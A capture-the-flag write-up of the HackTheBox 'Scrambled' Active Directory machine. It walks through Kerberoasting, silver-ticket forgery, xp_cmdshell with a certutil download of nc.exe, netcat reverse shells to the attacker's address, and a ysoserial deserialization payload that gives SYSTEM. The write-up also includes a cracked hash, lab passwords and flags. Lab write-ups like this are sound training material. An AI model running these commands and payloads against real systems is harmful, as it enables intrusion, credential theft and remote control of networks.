---
title: "Scrambled"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
  - Windows
tags:
  - HackTheBox
  - Active Directory
---

# Scrambled

![](assets/Pasted%20image%2020250510162846.png)
<!-- more -->

## Enumeration

```bash
$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.168
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 23:20 CET
Nmap scan report for 10.10.11.168
Host is up (0.040s latency).
Not shown: 65514 filtered tcp ports (no-response)
Bug in ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Scramble Corp Intranet
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-27 22:20:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2024-11-27T22:23:46+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-27T22:23:46+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-11-27T22:23:46+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-27T22:18:30
|_Not valid after:  2054-11-27T22:18:30
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2024-11-27T22:23:46+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2024-11-27T22:23:46+00:00; 0s from scanner time.
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
54199/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| smb2-time: 
|   date: 2024-11-27T22:23:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.34 seconds
```

The web doesn't have any working forms, but there is a tutorial for submitting errors to support that leaks a username.

![](assets/Pasted%20image%2020241128131527.png)

It explains that all usernames submitted will have their password reset to the same as the username.

With this, user `ksimpson:ksimpson` can enumerate shares using Kerberos and `impacket-smbclient`.

```bash
$ impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
```

The only share we can access is `Public`, and there is a PDF file inside:

![](assets/Pasted%20image%2020241128175830.png)

## Initial Access

With valid credentials, the most common thing to test is checking for kerberoastable users using Kerberos

```bash
$ impacket-GetUserSPNs -dc-ip 10.10.11.168 scrm.local/ksimpson -request -k -dc-host dc1.scrm.local -request 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2024-11-27 23:18:27.549358             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2024-11-27 23:18:27.549358             


[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$7e6ce0425e0f83246932a0d054edb65b$39b6c747a1fad03b191151ca4c0a9a88fb7650fd66cd9b6876212313360e43091f01c0a044ea37d9dac3e92b43b505f3b99f7911a7d60e46f883ebdbf1d42102db4d0bb339100eb49b52d6cbfde18f187fd4266941eb021d6f2f58afae2e42f17ebbbe9357bfbba2b95ad2d2898146af9c3077e4dbfd1063258b42b60c3ae46c6db355b756a585888ab0a7ba95a18514a492676a2878038dd193f3cf17c0e8d3c59a8f2ef1308ab27ed0e812fd77532bb0deea3f2f2c65b855f73235157192010bb1b1f75f4cf09f0eae9a31a1c8441707955fa6cd1db6afcc826216580194442cf0f3ed7a52e953b650196fb3efa88696abc24bf51a7f48728fdaff6bb08b8bd424607697d63db87e097b9cefd0b1c2bf69177535e491f2c9b0c6a7d0fce2b9479f1c7a5c406f7fe3a4badc9ea1905da9791a08b6d1496e3a4eb4ffa8ef28be956403cdc54312726a9131f7ae245d79d9bb6cdaeeca49b96bf0a2bef6bc7aff4d87e39bb13ee5105e6f846fff9ec874a9bf3277f3848585a876a56b978b71d0d3e35134f4ab60e2c398fbb6eae65370566043a9dda932a8f5b187c5b409523a00fffc33c655a91422b41d9d7686b7f28668614170a1a1f890ddf0b2f38abd323f7b3907c5bcc5d94f2400ff85bf3d21e3dcc3211bc2ad6c07512a5198438c33ac33031a17efa86f6cc5ca71a84b06d6d09837b6a906393d35dac60ca60cc11b99481bb5deb60df8fa07af065b996eb47a56a1d3882fe7aa8790dc59294a68c24f2ea145660c26e67ec5c0d18d08b1b88715f216c95617b036ed28ff077c57da841ac004d79377ec06e60d09cdf66e124447734799973317bd90b67dfe7988197fb444ad8787755d291bf5b1f5b7e29e0e263a23b9a25994a9b3aa419cbfb2d3aee9ecdc6dcde4aa55e45750eb795c2223052ace4ec052cfe00606e5595051b1e58d9ea78c623c7bad41b9f698f95411d9d22a0bae3c7d58eace2bf70c4b24ee8a30d50f3e797b6fc619a3af9550cd2c966de81e79465f552b78f1cb4fb12887068af662ed5bee38d6ed4a33ffd6d06ad6f6e1526ec30ee7b3d1a6e0b41c1cdf35b11b28eaf20cf5c477beb9faa83753178e8d6a3c5e56198145fecf6e1c05c8f5ab0bfa18b58662d9380f42a22c61e41cc6d2672b5816a2103930353d7cd25a5988f1efef0b31316eb6ed0deecca53bcc6e412e8e753645efc3d4dd8226b3d45d238c994f7ab3b11d6b3e097b852bf8592a6300e70573f649fa22619297e2c05526408e7973221818ce0b57cd28c1a17478f43df47c179e98d5b40e11515efafdbd61b0dc004f1550b3ab1ab3334e157fc7444d3c17bddb78afa37993afdbf7773a146e2242b190ac06e8f6fcb6e137f422a2f6926e1e8c3ef18c8f856af519bd9fc227fa4b4cfef9a4bd154bc7bf5752e9830c02688a1e3bcc8b
```

We have `sqlsvc` and, using `john`:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash       
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Pegasus60        (?)     
1g 0:00:00:08 DONE (2024-11-28 17:13) 0.1153g/s 1237Kp/s 1237Kc/s 1237KC/s Peguero..Pearce
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

So we have `sqlsvc:Pegasus60`. Let's try to connect to `mssql`.

We have to connect using Kerberos, so we need the TGT. Now with `impacket-mssqlclient`:

```bash
$ KRB5CCNAME=/home/kali/scrambled/sqlsvc.ccache impacket-mssqlclient dc1.scrm.local -k   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.
```

We can't, so as we have service account credentials, we could try to forge a silver ticket.

First, the domain SID:

```bash
$ impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

...
             1827831105,
             2542523200,
        ] 
ResourceGroupCount:              1 
ResourceGroupIds:               
    [
         
        RelativeId:                      572 
        Attributes:                      536870919 ,
    ] 
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

The NTLM hash can be converted online: `B999A16500B87D17EC7F2E2A68778F05`

![](assets/Pasted%20image%2020241129103502.png)

The SPN of the service is `mssql`, which we can get with `GetUserSPNs`:

```bash
$ impacket-GetUserSPNs -dc-ip 10.10.11.168 scrm.local/ksimpson:ksimpson -request -k -dc-host dc1.scrm.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2024-11-29 10:17:17.244732             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2024-11-29 10:17:17.244732
```

Forge the ticket:

```bash
$ impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

Now we can enter `mssql` with `Administrator` credentials:

```bash
$ KRB5CCNAME=Administrator.ccache impacket-mssqlclient dc1.scrm.local -k  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> 
```

Inside the DB, we have credentials:

```bash
SQL (SCRM\administrator  dbo@master)> enum_db
name         is_trustworthy_on   
----------   -----------------   
master                       0   

tempdb                       0   

model                        0   

msdb                         1   

ScrambleHR                   0   

SQL (SCRM\administrator  dbo@master)> use ScrambleHR
ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
SQL (SCRM\administrator  dbo@ScrambleHR)> select * from scramblehr.information_schema.tables;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
ScrambleHR      dbo            Employees    b'BASE TABLE'   

ScrambleHR      dbo            UserImport   b'BASE TABLE'   

ScrambleHR      dbo            Timesheets   b'BASE TABLE'   

SQL (SCRM\administrator  dbo@ScrambleHR)> select * from Employees;
EmployeeID   FirstName   Surname   Title   Manager   Role   
----------   ---------   -------   -----   -------   ----   
SQL (SCRM\administrator  dbo@ScrambleHR)> select * from UserImport;
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0  
```

`MiscSvc:ScrambledEggs9900`

We can execute shells if we enable `xp_cmdshell` and, using `xp_cmdshell 'cmd'`, we can do a reverse shell.

```bash
SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement tstall.
SQL (SCRM\administrator  dbo@master)> xp_cmdshell "certutil -urlcache -split -f http://10.10.14.11/nc.exe C:p\nc.exe"
output                                                
---------------------------------------------------   
****  Online  ****                                    

  0000  ...                                           

  e800                                                

CertUtil: -URLCache command completed successfully.   

NULL                                                  


SQL (SCRM\administrator  dbo@master)> xp_cmdshell "C:\Temp\nc.exe -e cmd 10.10.14.11 443"

```

```bash
$ nc -lnvp 443            
listening on [any] 443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 49597
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
scrm\sqlsvc


```

## Privilege Escalation

```
C:\Users>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users> $pass=ConvertTo-SecureString "ScrambledEggs9900" -AsPlainText -Force
$pass=ConvertTo-SecureString "ScrambledEggs9900" -AsPlainText -Force
PS C:\Users> $cred=New-Object System.Management.Automation.PSCredential("scrm.local\MiscSvc", $pass)
$cred=New-Object System.Management.Automation.PSCredential("scrm.local\MiscSvc", $pass)
PS C:\Users> Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { whoami }
Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { whoami }
scrm\miscsvc
PS C:\Users> Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { C:\Temp\nc.exe -e cmd 10.10.14.11 444 }
Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { C:\Temp\nc.exe -e cmd 10.10.14.11 444 }
```

```bash
$ nc -lnvp 444           
listening on [any] 444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 64158
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\miscsvc\Documents>whoami
whoami
scrm\miscsvc
```

As this user, we can execute commands as the new user we found in the database and get another reverse shell.

```bash
$ nc -lnvp 444           
listening on [any] 444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 64158
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\miscsvc\Documents>whoami
whoami
scrm\miscsvc

C:\Users\miscsvc\Desktop>type user.txt
type user.txt
25410e6a43413a693bdea407429f67ed
```

With this new user, we can re-enumerate SMB shares. Now we can enter the `IT` folder, and there is the web tutorial app from before here.

```bash
$ impacket-smbclient scrm.local/MiscSvc:ScrambledEggs9900@dc1.scrm.local -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Nov  3 20:32:55 2021 .
drw-rw-rw-          0  Wed Nov  3 20:32:55 2021 ..
drw-rw-rw-          0  Wed Nov  3 22:06:32 2021 Apps
drw-rw-rw-          0  Wed Nov  3 20:32:44 2021 Logs
drw-rw-rw-          0  Wed Nov  3 20:32:55 2021 Reports
# cd Apps
# ls
drw-rw-rw-          0  Wed Nov  3 22:06:32 2021 .
drw-rw-rw-          0  Wed Nov  3 22:06:32 2021 ..
drw-rw-rw-          0  Fri Nov  5 21:57:08 2021 Sales Order Client
# cd Sales Order Client
# ls
drw-rw-rw-          0  Fri Nov  5 21:57:08 2021 .
drw-rw-rw-          0  Fri Nov  5 21:57:08 2021 ..
-rw-rw-rw-      86528  Fri Nov  5 21:57:08 2021 ScrambleClient.exe
-rw-rw-rw-      19456  Fri Nov  5 21:57:08 2021 ScrambleLib.dll
# get ScrambleClient.exe
# get ScrambleLib.dll
# ls
drw-rw-rw-          0  Fri Nov  5 21:57:08 2021 .
drw-rw-rw-          0  Fri Nov  5 21:57:08 2021 ..
-rw-rw-rw-      86528  Fri Nov  5 21:57:08 2021 ScrambleClient.exe
-rw-rw-rw-      19456  Fri Nov  5 21:57:08 2021 ScrambleLib.dll
# exit
```

We'll open this with a .NET debugger to search for useful information.

![](assets/Pasted%20image%2020241129170124.png)

There is a username for instant access to the app. Let's try to connect (remember to add `scrm.local` to hosts in Windows).

![](assets/Pasted%20image%2020241129170945.png)

We create a new order and check the logs.

![](assets/Pasted%20image%2020241129171122.png)

We see that the orders are being base64-encoded to the server. If we can send an order to port `4411` with a payload, maybe it gets executed. [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)

So we can use `UPLOAD_ORDER;<serialized payload>`

```bash
C:\Users\krovs\Downloads\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release>ysoserial.exe -g WindowsIdentity -f BinaryFormatter -o base64 -c "C:\Temp\nc.exe -e cmd 10.10.14.11 443"
AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA8AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMUFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDQXhNQzR4TUM0eE5DNHhNU0EwTkRNaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==
```

```bash
$ nc dc1.scrm.local 4411
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VR5LmFjdG9yAQYCAAAA8AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjMMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMTDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDQXhNQzR4TUM0eE5DNHhNU0EwTkRNaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1PbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1
ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.

```

```bash
$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 62576
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Post Exploitation

```shell
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
6bd97f1d5ed34982faa14e355e8f3c52
```
